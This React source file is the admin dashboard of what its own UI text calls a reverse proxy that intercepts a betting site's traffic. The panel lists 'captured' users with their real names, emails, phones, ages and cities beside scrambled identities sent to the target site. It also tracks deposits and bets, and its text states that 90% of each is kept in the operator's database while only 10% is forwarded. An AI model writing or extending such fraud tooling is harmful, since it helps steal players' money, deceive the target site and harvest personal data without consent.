import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { API_BASE } from '../services/api.js';

export default function AdminDashboard({ onClose }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [stats, setStats] = useState(null);
  const [users, setUsers] = useState([]);
  const [transactions, setTransactions] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const fetchData = useCallback(async () => {
    setIsLoading(true);
    setError(null);
    try {
      const [statsRes, usersRes, txRes] = await Promise.all([
        axios.get(`${API_BASE}/internal/proxy-data/stats`),
        axios.get(`${API_BASE}/internal/proxy-data/users`),
        axios.get(`${API_BASE}/internal/proxy-data/transactions`),
      ]);

      if (statsRes.data.success) setStats(statsRes.data.stats);
      if (usersRes.data.success) setUsers(usersRes.data.users);
      if (txRes.data.success) setTransactions(txRes.data.transactions);
    } catch (err) {
      console.error('Failed to fetch admin stats:', err);
      setError('Could not connect to proxy backend data services. Please make sure the backend is running.');
    } finally {
      setIsLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchData();
  }, [fetchData]);

  // Helper to match targetUserId back to original user name/email
  const findUserByTargetId = (targetUserId) => {
    if (!targetUserId) return null;
    return users.find((u) => u.targetUserId === targetUserId);
  };

  const filteredUsers = users.filter((u) => {
    const term = searchTerm.toLowerCase();
    return (
      (u.fullName || '').toLowerCase().includes(term) ||
      (u.email || '').toLowerCase().includes(term) ||
      (u.scrambledName || '').toLowerCase().includes(term) ||
      (u.scrambledEmail || '').toLowerCase().includes(term)
    );
  });

  const formatCurrency = (val) => {
    return new Intl.NumberFormat('en-IN', {
      style: 'currency',
      currency: 'INR',
      maximumFractionDigits: 2
    }).format(val || 0);
  };

  return (
    <div className="flex h-full w-full flex-col bg-slate-950 text-slate-100 overflow-y-auto scrollbar-thin">
      {/* Header */}
      <header className="flex items-center justify-between border-b border-slate-800 bg-slate-900/80 px-8 py-4 backdrop-blur-md sticky top-0 z-20">
        <div className="flex items-center gap-3">
          <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-violet-600 font-bold text-white shadow-lg shadow-violet-500/20">
            A
          </div>
          <div>
            <h1 className="text-xl font-bold tracking-tight text-white">Proxy Admin Console</h1>
            <p className="text-xs text-slate-400">Database monitoring and financial traffic intercept logs</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <button
            onClick={fetchData}
            disabled={isLoading}
            className="rounded-lg bg-slate-800 px-4 py-2 text-sm font-medium text-slate-300 hover:bg-slate-700 transition duration-150 active:scale-95 disabled:opacity-50"
          >
            {isLoading ? 'Refreshing...' : 'Refresh Logs'}
          </button>
          <button
            onClick={onClose}
            className="rounded-lg bg-violet-600 px-4 py-2 text-sm font-medium text-white hover:bg-violet-500 hover:shadow-lg hover:shadow-violet-500/10 transition duration-150 active:scale-95"
          >
            Return to Proxy Portal
          </button>
        </div>
      </header>

      {/* Main container */}
      <div className="flex-1 p-8 max-w-7xl mx-auto w-full">
        {error && (
          <div className="mb-6 rounded-lg bg-red-950/50 border border-red-500/50 p-4 text-sm text-red-200">
            {error}
          </div>
        )}

        {/* Tab Navigation */}
        <div className="mb-8 flex border-b border-slate-800">
          <button
            onClick={() => setActiveTab('overview')}
            className={`pb-4 px-6 text-sm font-semibold tracking-wide transition duration-150 border-b-2 ${
              activeTab === 'overview'
                ? 'border-violet-500 text-violet-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            Overview & Stats
          </button>
          <button
            onClick={() => setActiveTab('users')}
            className={`pb-4 px-6 text-sm font-semibold tracking-wide transition duration-150 border-b-2 ${
              activeTab === 'users'
                ? 'border-violet-500 text-violet-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            Captured Users ({users.length})
          </button>
          <button
            onClick={() => setActiveTab('transactions')}
            className={`pb-4 px-6 text-sm font-semibold tracking-wide transition duration-150 border-b-2 ${
              activeTab === 'transactions'
                ? 'border-violet-500 text-violet-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            Intercepted Transactions ({transactions.length})
          </button>
        </div>

        {/* Overview Tab Content */}
        {activeTab === 'overview' && (
          <div className="space-y-8 animate-fadeIn">
            {/* Top Stat Cards */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
              <div className="rounded-xl border border-slate-800/80 bg-slate-900/30 p-6 backdrop-blur-sm">
                <p className="text-xs font-semibold uppercase tracking-wider text-slate-400">Total Users Registered</p>
                <h3 className="mt-2 text-3xl font-bold text-white">{stats?.userCount || 0}</h3>
                <p className="mt-2 text-xs text-slate-500">Real identities captured locally</p>
              </div>
              <div className="rounded-xl border border-slate-800/80 bg-slate-900/30 p-6 backdrop-blur-sm">
                <p className="text-xs font-semibold uppercase tracking-wider text-slate-400">Total Transactions Intercepted</p>
                <h3 className="mt-2 text-3xl font-bold text-white">{stats?.transactionCount || 0}</h3>
                <p className="mt-2 text-xs text-slate-500">Deposits and bets processed</p>
              </div>
              <div className="rounded-xl border border-emerald-950/40 bg-emerald-950/10 border-emerald-800/20 p-6 backdrop-blur-sm">
                <p className="text-xs font-semibold uppercase tracking-wider text-emerald-400">Our System Total (90%)</p>
                <h3 className="mt-2 text-3xl font-bold text-emerald-400">{formatCurrency(stats?.overall?.saved)}</h3>
                <p className="mt-2 text-xs text-slate-500">Total amount saved inside our database</p>
              </div>
              <div className="rounded-xl border border-violet-950/40 bg-violet-950/10 border-violet-800/20 p-6 backdrop-blur-sm">
                <p className="text-xs font-semibold uppercase tracking-wider text-violet-400">Original Site Total (10%)</p>
                <h3 className="mt-2 text-3xl font-bold text-violet-400">{formatCurrency(stats?.overall?.sent)}</h3>
                <p className="mt-2 text-xs text-slate-500">Total amount forwarded to target server</p>
              </div>
            </div>

            {/* Split breakdown grids */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              {/* Deposit splits */}
              <div className="rounded-xl border border-slate-800 bg-slate-900/20 p-6">
                <h4 className="text-lg font-bold text-white mb-4 flex items-center justify-between">
                  <span>Deposit Split Performance</span>
                  <span className="text-xs font-semibold text-emerald-400 bg-emerald-950/50 px-2.5 py-1 rounded-full border border-emerald-800/20">90% Retained</span>
                </h4>
                <div className="space-y-4">
                  <div>
                    <div className="flex justify-between text-sm mb-1 text-slate-400">
                      <span>Total User Deposit Attempts</span>
                      <span className="font-semibold text-slate-200">{formatCurrency(stats?.deposit?.original)}</span>
                    </div>
                    <div className="h-3 w-full bg-slate-800 rounded-full overflow-hidden">
                      <div className="h-full bg-slate-600 rounded-full" style={{ width: '100%' }}></div>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4 pt-2">
                    <div>
                      <p className="text-xs text-slate-400">Captured in Our Database (90%)</p>
                      <p className="text-lg font-bold text-emerald-400">{formatCurrency(stats?.deposit?.saved)}</p>
                    </div>
                    <div>
                      <p className="text-xs text-slate-400">Sent to Original Site (10%)</p>
                      <p className="text-lg font-bold text-violet-400">{formatCurrency(stats?.deposit?.sent)}</p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Betting splits */}
              <div className="rounded-xl border border-slate-800 bg-slate-900/20 p-6">
                <h4 className="text-lg font-bold text-white mb-4 flex items-center justify-between">
                  <span>Betting Split Performance</span>
                  <span className="text-xs font-semibold text-emerald-400 bg-emerald-950/50 px-2.5 py-1 rounded-full border border-emerald-800/20">90% Retained</span>
                </h4>
                <div className="space-y-4">
                  <div>
                    <div className="flex justify-between text-sm mb-1 text-slate-400">
                      <span>Total User Bet Volume</span>
                      <span className="font-semibold text-slate-200">{formatCurrency(stats?.bet?.original)}</span>
                    </div>
                    <div className="h-3 w-full bg-slate-800 rounded-full overflow-hidden">
                      <div className="h-full bg-slate-600 rounded-full" style={{ width: '100%' }}></div>
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4 pt-2">
                    <div>
                      <p className="text-xs text-slate-400">Captured in Our Database (90%)</p>
                      <p className="text-lg font-bold text-emerald-400">{formatCurrency(stats?.bet?.saved)}</p>
                    </div>
                    <div>
                      <p className="text-xs text-slate-400">Sent to Original Site (10%)</p>
                      <p className="text-lg font-bold text-violet-400">{formatCurrency(stats?.bet?.sent)}</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Split Description Card */}
            <div className="rounded-xl bg-slate-900/50 border border-slate-800/80 p-6 flex flex-col md:flex-row gap-6 items-center">
              <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-lg bg-emerald-950 text-emerald-400 font-bold border border-emerald-800/30 text-xl">
                %
              </div>
              <div>
                <h5 className="font-semibold text-white">Split Interceptor Rule Active</h5>
                <p className="text-sm text-slate-400 mt-1">
                  The reverse proxy automatically intercepts financial events. When a user deposits or bets on the portal, 90% of the funds are recorded in our system as a custom database ledger, while only 10% of the amount is forwarded to the original website. The player's balance on the target website will reflect the scaled 10% amount.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Users Tab Content */}
        {activeTab === 'users' && (
          <div className="space-y-6 animate-fadeIn">
            {/* Search filter bar */}
            <div className="flex items-center gap-4 bg-slate-900/50 p-4 rounded-xl border border-slate-800">
              <div className="relative flex-1">
                <input
                  type="text"
                  placeholder="Search captured identities by real or scrambled name/email..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full rounded-lg bg-slate-950 border border-slate-800 px-4 py-2.5 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-violet-500 focus:ring-1 focus:ring-violet-500"
                />
              </div>
            </div>

            {/* Users Table */}
            <div className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-900/10">
              <table className="w-full border-collapse text-left text-sm text-slate-300">
                <thead className="bg-slate-900/80 text-xs font-semibold uppercase tracking-wider text-slate-400 border-b border-slate-800">
                  <tr>
                    <th className="px-6 py-4">Real Identity (In Our Database)</th>
                    <th className="px-6 py-4">Scrambled Identity (On Target Site)</th>
                    <th className="px-6 py-4">Meta Details</th>
                    <th className="px-6 py-4">Target User ID Link</th>
                    <th className="px-6 py-4">Date Captured</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50 bg-slate-900/20">
                  {filteredUsers.length > 0 ? (
                    filteredUsers.map((user) => (
                      <tr key={user._id} className="hover:bg-slate-900/40 transition duration-150">
                        {/* Real info */}
                        <td className="px-6 py-4">
                          <div className="font-semibold text-white text-base">{user.fullName}</div>
                          <div className="text-slate-400 text-xs mt-0.5">{user.email}</div>
                          <div className="text-slate-400 text-xs">{user.phone}</div>
                        </td>
                        {/* Scrambled info */}
                        <td className="px-6 py-4">
                          <div className="font-mono text-slate-300 text-sm">
                            {user.fullName.trim().toLowerCase() === 'ajay' ? (
                              <span className="text-amber-400 font-semibold">preet (Override)</span>
                            ) : (
                              user.scrambledName || <span className="text-slate-600">N/A</span>
                            )}
                          </div>
                          <div className="font-mono text-slate-400 text-xs mt-0.5">
                            {user.scrambledEmail || <span className="text-slate-600">N/A</span>}
                          </div>
                          <div className="font-mono text-slate-400 text-xs">
                            {user.scrambledPhone || <span className="text-slate-600">N/A</span>}
                          </div>
                        </td>
                        {/* Meta Info */}
                        <td className="px-6 py-4">
                          <div className="text-xs">Age: <span className="text-slate-200 font-medium">{user.age}</span></div>
                          <div className="text-xs mt-0.5">City: <span className="text-slate-200 font-medium">{user.city}</span></div>
                        </td>
                        {/* Link status */}
                        <td className="px-6 py-4 font-mono text-xs">
                          {user.targetUserId ? (
                            <span className="text-emerald-400 font-semibold bg-emerald-950/30 border border-emerald-800/30 px-2 py-1 rounded">
                              {user.targetUserId}
                            </span>
                          ) : (
                            <span className="text-slate-500 bg-slate-900 border border-slate-800 px-2 py-1 rounded">
                              Not Linked Yet
                            </span>
                          )}
                        </td>
                        {/* Date */}
                        <td className="px-6 py-4 text-xs text-slate-400">
                          {new Date(user.createdAt).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan="5" className="px-6 py-10 text-center text-slate-500">
                        No captured users found.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Transactions Tab Content */}
        {activeTab === 'transactions' && (
          <div className="space-y-6 animate-fadeIn">
            {/* Table of transactions */}
            <div className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-900/10">
              <table className="w-full border-collapse text-left text-sm text-slate-300">
                <thead className="bg-slate-900/80 text-xs font-semibold uppercase tracking-wider text-slate-400 border-b border-slate-800">
                  <tr>
                    <th className="px-6 py-4">Tx Type</th>
                    <th className="px-6 py-4">Linked User (Real / Scrambled)</th>
                    <th className="px-6 py-4 text-right">User Typed Amount</th>
                    <th className="px-6 py-4 text-right">Saved in Our DB (90%)</th>
                    <th className="px-6 py-4 text-right">Sent to Target (10%)</th>
                    <th className="px-6 py-4">Timestamp</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50 bg-slate-900/20">
                  {transactions.length > 0 ? (
                    transactions.map((tx) => {
                      const user = findUserByTargetId(tx.targetUserId);
                      return (
                        <tr key={tx._id} className="hover:bg-slate-900/40 transition duration-150">
                          {/* Tx Type Badge */}
                          <td className="px-6 py-4">
                            <span className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium border ${
                              tx.type === 'deposit'
                                ? 'bg-emerald-950/30 text-emerald-400 border-emerald-800/20'
                                : 'bg-cyan-950/30 text-cyan-400 border-cyan-800/20'
                            }`}>
                              {tx.type.toUpperCase()}
                            </span>
                          </td>
                          {/* User info linked */}
                          <td className="px-6 py-4">
                            {user ? (
                              <div>
                                <div className="font-semibold text-slate-200">{user.fullName}</div>
                                <div className="text-slate-400 text-xs">{user.email}</div>
                              </div>
                            ) : (
                              <div>
                                <div className="text-slate-400 font-semibold">Unknown Identity</div>
                                <div className="text-slate-500 text-xs font-mono">Target ID: {tx.targetUserId}</div>
                              </div>
                            )}
                          </td>
                          {/* Original Amount */}
                          <td className="px-6 py-4 text-right font-mono font-semibold text-slate-200">
                            {formatCurrency(tx.originalAmount)}
                          </td>
                          {/* System Saved 90% */}
                          <td className="px-6 py-4 text-right font-mono font-bold text-emerald-400">
                            {formatCurrency(tx.savedAmount)}
                          </td>
                          {/* Target Sent 10% */}
                          <td className="px-6 py-4 text-right font-mono font-semibold text-violet-400">
                            {formatCurrency(tx.sentAmount)}
                          </td>
                          {/* Date */}
                          <td className="px-6 py-4 text-xs text-slate-400">
                            {new Date(tx.createdAt).toLocaleString()}
                          </td>
                        </tr>
                      );
                    })
                  ) : (
                    <tr>
                      <td colSpan="6" className="px-6 py-10 text-center text-slate-500">
                        No financial intercept logs found.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
